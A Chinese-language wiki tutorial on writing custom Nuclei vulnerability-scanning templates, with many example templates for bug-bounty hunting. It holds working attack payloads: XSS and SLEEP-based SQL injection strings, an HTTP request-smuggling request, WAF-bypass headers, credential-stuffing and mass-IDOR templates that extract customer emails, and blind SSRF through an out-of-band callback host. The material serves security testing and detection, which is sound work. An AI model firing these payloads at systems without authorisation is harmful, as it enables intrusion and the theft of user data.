---
type: wiki
category: tool
tool: nuclei
status: active
last-updated: 2026-04-21
---

# Nuclei 自寫 Template 教學

> **用途：** 官方 community-templates 收錄的是 generic CVE / misconfig。對特定 target / 客製 vendor bug 要自寫。
> 精通自寫 template 是從「script kiddie」升級「hunter」的關鍵技能。

## 0. YAML 基本結構

```yaml
id: my-template-name                    # 唯一識別
info:
  name: Target Vendor XYZ Info Disclosure
  author: your-handle
  severity: medium                      # info / low / medium / high / critical
  description: |
    說明漏洞類型 + 檢測方法
  reference:
    - https://example.com/advisory
    - https://cve.mitre.org/CVE-2026-XXXXX
  classification:
    cve-id: CVE-2026-XXXXX
    cvss-score: 7.5
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cwe-id: CWE-200
  metadata:
    shodan-query: 'http.title:"Target Vendor XYZ"'
    fofa-query: 'title="XYZ Admin Panel"'
  tags: xyz,info-disclosure,2026

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/debug"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "debug_info"
          - "database"
        part: body
```

## 1. Protocol Types

```
http    | DNS over HTTP / 一般 HTTP/S request
dns     | DNS record 查詢
tcp     | raw TCP（port probe / banner）
file    | 本地檔案掃（掃 source 用）
network | alias for tcp
ssl     | SSL cert analyze
code    | 執行 shell/python script
javascript | 瀏覽器端 JS 執行
headless   | Chromium headless browser
whois   | WHOIS 查詢
websocket | WebSocket
```

## 2. Matchers 全解

### 2.1 `word`（文字比對）

```yaml
matchers:
  - type: word
    words:
      - "admin panel"
      - "Server: Apache/2.4.49"
    part: body                # body / header / all / response / interactsh_request
    condition: or             # or / and（預設 or）
    case-insensitive: true
    negative: false           # true = 反向（不能出現這個字）
```

### 2.2 `regex`

```yaml
matchers:
  - type: regex
    regex:
      - 'password[\s:=]+["\']?([a-zA-Z0-9]{8,})'
    part: body
```

### 2.3 `status`

```yaml
matchers:
  - type: status
    status:
      - 200
      - 301
      - 302
    negative: false
```

### 2.4 `size`

```yaml
matchers:
  - type: size
    size:
      - 1234
    # 用來鎖定 exact bytes，特別是 404 page 有固定大小時
```

### 2.5 `binary`（二進位 signature）

```yaml
matchers:
  - type: binary
    binary:
      - "504B0304"            # ZIP magic bytes
      - "89504E47"            # PNG
    encoding: hex
```

### 2.6 `dsl`（最強大，支援運算式）

```yaml
matchers:
  - type: dsl
    dsl:
      - 'status_code == 200 && contains(body, "admin") && !contains(body, "login")'
      - 'len(body) > 1000 && regex("pass[^a-z]", body)'
      - 'duration > 5'        # time-based
```

### 2.7 多 matcher 邏輯

```yaml
matchers-condition: and       # 所有 matchers 都要 match
# 或
matchers-condition: or        # 任一 match 即可

matchers:
  - type: status
    status: [200]
  - type: word
    words: ["admin"]
```

## 3. Extractors（抽資料）

```yaml
extractors:
  - type: regex
    part: body
    regex:
      - 'user_id["\s:=]+(\d+)'
    group: 1                  # 抓第 1 個 capture group

  - type: kval                # key=value header
    kval:
      - server
      - x_powered_by

  - type: json
    json:
      - '.data[].id'          # jq syntax

  - type: xpath
    xpath:
      - '//h1/text()'
    attribute: null

  - type: dsl
    dsl:
      - 'trim(regex_extract("^.*?=(.*)$", body))'
```

Extractor 的值可在後續 request 使用（詳見 §5 workflow）。

## 4. Payload / Fuzzing Loop

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - ".git/config"
        - ".env"
        - "WEB-INF/web.xml"
        - "config.json"
        - "backup.zip"

    stop-at-first-match: true   # 找到 1 個就停
    threads: 10

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && len(body) > 50'
```

### 4.1 巢狀 payload

```yaml
payloads:
  user:
    - admin
    - root
    - test
  password:
    - admin
    - password
    - "{{user}}123"           # 用前面的變數
```

### 4.2 從檔案讀

```yaml
payloads:
  path: helpers/paths.txt      # 相對 template 的路徑
```

### 4.3 Pitchfork / Clusterbomb

```yaml
attack: clusterbomb           # 笛卡爾乘積（user × password）
# 或
attack: pitchfork             # 並列（user[0]:password[0], user[1]:password[1]）
# 或
attack: batteringram          # 所有 payload 用同一個
```

## 5. Multi-step Workflow（串連 request）

```yaml
http:
  # Step 1: 登入取 token
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"admin","password":"admin"}

    extractors:
      - type: json
        json:
          - '.token'
        name: auth_token
        internal: true         # internal=true → 不顯示在 output，只給後續 step 用

  # Step 2: 用 token 打 admin API
  - raw:
      - |
        GET /api/admin/users HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{auth_token}}

    matchers:
      - type: word
        words: ["email"]
        part: body
```

## 6. Raw HTTP（最強，可塞任何 header/body）

```yaml
http:
  - raw:
      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        X-Original-URL: /admin
        User-Agent: Mozilla/5.0

      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"email":"{{email}}","password":"{{pw}}"}

    payloads:
      email: emails.txt
      pw: passwords.txt
    attack: pitchfork

    matchers:
      - type: word
        words: ["token"]
```

## 7. Unsafe HTTP（HTTP/1.1 smuggling / malformed）

```yaml
http:
  - raw:
      - |+
        GET /admin HTTP/1.1
        Host: target.com
        Content-Length: 44
        Transfer-Encoding: chunked

        0

        GET /internal HTTP/1.1
        Host: target.com


    unsafe: true              # 允許違反 HTTP spec 的 request
    matchers:
      - type: word
        words: ["internal"]
```

## 8. DNS / OOB（Blind 漏洞偵測）

```yaml
http:
  - method: POST
    path: ["{{BaseURL}}/api/search"]
    body: |
      {"q":"test","callback":"{{interactsh-url}}"}

    matchers:
      - type: word
        part: interactsh_protocol   # dns / http / smtp
        words:
          - "dns"

# interactsh-url 會自動換成 oast.site 的 unique hostname
# 對方發 DNS/HTTP → nuclei 收到 → match
```

## 9. Time-based（Blind SQLi / delay）

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/search?q='+OR+SLEEP(5)--"

    matchers:
      - type: dsl
        dsl:
          - 'duration >= 5'
```

## 10. Headless（JS 執行 / DOM XSS）

```yaml
headless:
  - steps:
      - args:
          url: "{{BaseURL}}/search?q=<script>document.title='XSS'</script>"
        action: navigate

      - action: waitload

      - args:
          code: "return document.title"
        action: script
        name: doc_title

    matchers:
      - type: word
        part: doc_title
        words: ["XSS"]
```

## 11. Code Protocol（執行本地 script）

```yaml
code:
  - engine:
      - python3

    source: |
      import sys
      target = sys.argv[1]
      # ... python 邏輯
      print("VULNERABLE")

    matchers:
      - type: word
        words: ["VULNERABLE"]
```

⚠️ Code template 預設 **disabled**。需要 `-code` flag 啟用：

```bash
nuclei -u target.com -t my-code-template.yaml -code
```

## 12. File Protocol（掃 local source）

```yaml
file:
  - extensions:
      - all
      - py
      - js

    extractors:
      - type: regex
        regex:
          - 'AKIA[A-Z0-9]{16}'
        name: aws_key
```

## 13. 變數與 Helper Functions

### 常用變數

```
{{BaseURL}}       | https://target.com
{{RootURL}}       | https://target.com（無 path）
{{Host}}          | target.com:443
{{Hostname}}      | target.com
{{Port}}          | 443
{{Path}}          | /admin
{{File}}          | /admin/test.php
{{randstr}}       | 隨機字串
{{rand_int(1,10)}}| 隨機整數
{{md5(value)}}    | MD5
{{interactsh-url}}| OAST URL
```

### Helper Functions

```yaml
# 字串
{{to_lower("ABC")}}                 # abc
{{to_upper("abc")}}                 # ABC
{{trim_prefix("hello world", "hello ")}}  # world
{{regex_extract("[a-z]+", "123abc")}}     # abc
{{replace("hello", "l", "L")}}      # heLLo
{{concat("a","b","c")}}             # abc

# 編碼
{{base64("test")}}                  # dGVzdA==
{{url_encode("a b")}}               # a%20b
{{html_escape("<script>")}}         # &lt;script&gt;
{{hex_encode("abc")}}               # 616263

# Hash
{{md5("test")}}
{{sha1("test")}}
{{sha256("test")}}

# 時間
{{unix_time()}}                     # 1736000000
{{date_time("%Y-%m-%d")}}

# JWT
{{generate_jwt('{"sub":"1"}',"HS256","secret")}}

# Random
{{rand_char(5)}}
{{rand_ip()}}
```

## 14. 實戰範例

### 14.1 Target-specific info disclosure

```yaml
id: vendor-xyz-debug-exposure
info:
  name: Vendor XYZ Admin Panel Debug Page Exposed
  author: hunter
  severity: high
  tags: xyz,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/internal/debug"
      - "{{BaseURL}}/admin/_debug"
      - "{{BaseURL}}/_console"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "xyz_internal_config"
          - "database_url"
        part: body
      - type: word
        words:
          - "login"
          - "403 Forbidden"
        negative: true

    extractors:
      - type: regex
        part: body
        regex:
          - 'database_url["\s:=]+([^"]+)'
        group: 1
```

### 14.2 Authenticated mass IDOR

```yaml
id: target-idor-shipment
info:
  name: Target.com shipment IDOR
  author: hunter
  severity: critical

http:
  - raw:
      - |
        GET /api/shipment/{{id}} HTTP/1.1
        Host: target.com
        Authorization: Bearer {{auth_token}}

    payloads:
      id:
        - "1"
        - "100"
        - "1000"
        - "99999"

    stop-at-first-match: false
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["customer_name", "tracking_number"]
        part: body

    extractors:
      - type: json
        json:
          - '.customer_name'
          - '.email'
```

執行：

```bash
nuclei -u https://target.com \
  -t idor.yaml \
  -var auth_token=eyJhbGci...
```

### 14.3 Fuzzing backup files

```yaml
id: backup-scan-deep
info:
  name: Backup File Scan
  author: hunter
  severity: medium

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{path}}"

    payloads:
      path:
        - "backup.zip"
        - "backup.tar.gz"
        - "db.sql"
        - "dump.sql"
        - "site.zip"
        - "www.zip"
        - "backup.rar"
        - "backup.7z"
        - "backup.old"
        - "backup.bak"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && len(body) > 10000'
          - '!contains(tolower(body), "<html")'
          - '!contains(tolower(body), "not found")'
```

### 14.4 WAF 繞過測試

```yaml
id: waf-bypass-test
info:
  name: WAF Bypass Header Test
  author: hunter
  severity: info

http:
  - raw:
      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        X-Original-URL: /admin

      - |
        GET /admin HTTP/1.1
        Host: {{Hostname}}
        X-Rewrite-URL: /admin

      - |
        GET /%2e%2e/admin HTTP/1.1
        Host: {{Hostname}}

      - |
        GET //admin HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "admin")'
```

## 15. Debug & 測試

```bash
# 跑單一 template
nuclei -u https://target.com -t my-template.yaml

# 詳細 debug
nuclei -u https://target.com -t my-template.yaml -debug
nuclei -u https://target.com -t my-template.yaml -debug-req
nuclei -u https://target.com -t my-template.yaml -debug-resp

# 驗證 YAML syntax
nuclei -validate -t my-template.yaml

# dry-run（不真打）
nuclei -u https://target.com -t my-template.yaml -dry-run

# verbose matcher
nuclei -u https://target.com -t my-template.yaml -v

# 匯出 JSON
nuclei -u https://target.com -t my-template.yaml -jsonl -o results.json
```

## 16. Best Practice

### ✅ DO

1. **Matcher 用 AND condition + 多重確認** — 避免誤報
2. **加 `negative` matcher 排除 404 / WAF page** — 例如 `!contains(body, "Access Denied")`
3. **Severity 要符合實際** — 單純 exposure 多半 info，有機密才 medium+
4. **用 `internal: true` 於中間步驟** — 不汙染 output
5. **`stop-at-first-match: true` 於 fuzz 場景** — 效率
6. **`id` 用 kebab-case + vendor prefix** — `vendor-product-cve`

### ❌ DON'T

1. ❌ 只用 `type: status` match 200 — 每個 web 都 return 200
2. ❌ 只比對 `"admin"` 一個字 — 太多誤報
3. ❌ Template 沒加 `tags` — 後續篩選困難
4. ❌ CVE template 沒附 `cve-id` / `classification`
5. ❌ Severity 誇大（小 info 掛 critical）

## 17. 投稿 community-templates

```bash
# Fork & clone
git clone git@github.com:YOUR_USER/nuclei-templates

# 放到對應目錄
cp my-template.yaml nuclei-templates/http/cves/2026/CVE-2026-XXXXX.yaml

# Lint
nuclei -validate -t CVE-2026-XXXXX.yaml

# PR template 需含：
# - 至少 1 個 public PoC link
# - reference 指向 advisory
# - metadata (shodan/fofa query)
# - 完整 matchers（非單一 word）
```

## 18. 實用 snippet 集

### 18.1 Reflected XSS（basic）

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=<script>alert(1)</script>"

    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
```

### 18.2 Time-based blind SQLi

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/user?id=1"
      - "{{BaseURL}}/api/user?id=1'+AND+SLEEP(5)--"

    req-condition: true

    matchers:
      - type: dsl
        dsl:
          - 'duration_2-duration_1 >= 5'
```

### 18.3 SSRF blind via OAST

```yaml
http:
  - method: POST
    path: ["{{BaseURL}}/api/webhook"]
    body: '{"url":"http://{{interactsh-url}}"}'

    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http"]
```

## 關聯文件

- [24-tool-nuclei.md](24-tool-nuclei.md) — 基礎用法
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) — 18 類別攻擊 template 索引
- Nuclei Templates Repo：https://github.com/projectdiscovery/nuclei-templates
- Nuclei Doc：https://docs.projectdiscovery.io/templates/
- Template Examples：https://github.com/projectdiscovery/nuclei-templates/tree/main/http
